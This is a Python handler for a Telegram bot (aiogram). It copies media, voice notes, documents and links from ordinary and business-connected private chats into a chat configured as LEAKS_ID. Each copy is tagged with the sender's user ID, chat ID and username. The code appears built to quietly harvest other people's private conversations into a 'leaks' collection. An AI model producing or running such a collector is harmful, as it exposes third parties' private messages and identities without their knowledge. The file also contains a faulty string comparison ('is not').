from aiogram import Bot, types
from config import LEAKS_ID
from utils.get_url import delete_not_url

async def forward_non_text_messages(bot: Bot, message: types.Message):
    """
    Пересылает все сообщения, кроме текстовых, в указанный чат LEAKS_ID.
    Если сообщение из бизнес-чата, копирует контент вручную.
    """
    is_forward = False
    original_user = None

    if message.forward_date:
        is_forward = True
        original_user = message.forward_from.username

    user_info = (
        f"📌 <b>Информация о пользователе:</b>\n"
        f"👤 <b>User ID:</b> <code>{message.from_user.id}</code>\n"
        f"💬 <b>Chat ID:</b> <code>{message.chat.id}</code>\n"
        f"🔗 <b>Username:</b> @{message.from_user.username if message.from_user.username else 'не указан'}\n"
        f"📤 <b>Пересланное:</b> {str(is_forward)}\n"
        f"🆔 <b>Оригинальный пользователь:</b> @{original_user if original_user else 'N/A'}"
    )

    if not message.business_connection_id:
        try:
            if message.content_type == "text":
                url = await delete_not_url(message.text)
                if url is not "":
                    forward_msg = await message.forward(LEAKS_ID)
                    await bot.send_message(LEAKS_ID, text=user_info, parse_mode="HTML", reply_to_message_id=forward_msg.message_id)
            else:
                forward_msg = await message.forward(LEAKS_ID)
                await bot.send_message(LEAKS_ID, text=user_info, parse_mode="HTML", reply_to_message_id=forward_msg.message_id)
        except Exception as e:
            print(f"Ошибка при пересылке сообщения: {e}")
        return

    try:
        if message.content_type == "text":
            url = await delete_not_url(message.text)
            if url:
                await bot.send_message(LEAKS_ID, text=url + "\n" +user_info, parse_mode="HTML")
        if message.photo:
            await bot.send_photo(LEAKS_ID, photo=message.photo[-1].file_id, caption=user_info, parse_mode="HTML")

        elif message.video:
            await bot.send_video(LEAKS_ID, video=message.video.file_id, caption=user_info, parse_mode="HTML")

        elif message.voice:
            await bot.send_voice(LEAKS_ID, voice=message.voice.file_id, caption=user_info, parse_mode="HTML")

        elif message.document:
            await bot.send_document(LEAKS_ID, document=message.document.file_id, caption=user_info, parse_mode="HTML")

        elif message.audio:
            await bot.send_audio(LEAKS_ID, audio=message.audio.file_id, caption=user_info, parse_mode="HTML")
            
        elif message.video_note:
            video_note = await bot.send_video_note(LEAKS_ID, video_note=message.video_note.file_id)
            await bot.send_message(LEAKS_ID, user_info, reply_to_message_id=video_note.message_id, parse_mode="HTML")
            
        elif message.sticker:
            sticker = await bot.send_sticker(LEAKS_ID, sticker=message.sticker.file_id)
            await bot.send_message(LEAKS_ID, user_info, reply_to_message_id=sticker.message_id, parse_mode="HTML")

    except Exception as e:
        print(f"Ошибка при копировании сообщения из бизнес-чата: {e}")
